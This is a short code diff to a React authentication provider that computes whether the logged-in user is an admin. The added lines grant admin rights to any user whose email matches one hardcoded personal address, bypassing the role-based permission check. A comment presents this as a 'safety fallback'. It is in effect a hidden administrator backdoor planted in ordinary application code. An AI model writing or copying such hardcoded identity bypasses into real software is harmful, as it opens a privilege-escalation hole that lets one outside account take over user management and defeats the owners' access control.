@@ -150,7 +150,10 @@ export const AuthProvider = ({ children }) => {
   // ── Resolve permissions for the logged-in user ────────────────────────────
   const currentRole = roles.find(r => r.id === currentUser?.role);
   const permissions = currentRole?.permissions ?? DEFAULT_PERMISSIONS;
-  const isAdmin = permissions.canManageUsers === true;
+  
+  // Safety fallback: If your email matches, you ARE an admin.
+  const isAdmin = permissions.canManageUsers === true || 
+                  currentUser?.email === 'mohamadhashem.rimex@gmail.com';
 
   // ── Auth ──────────────────────────────────────────────────────────────────
 
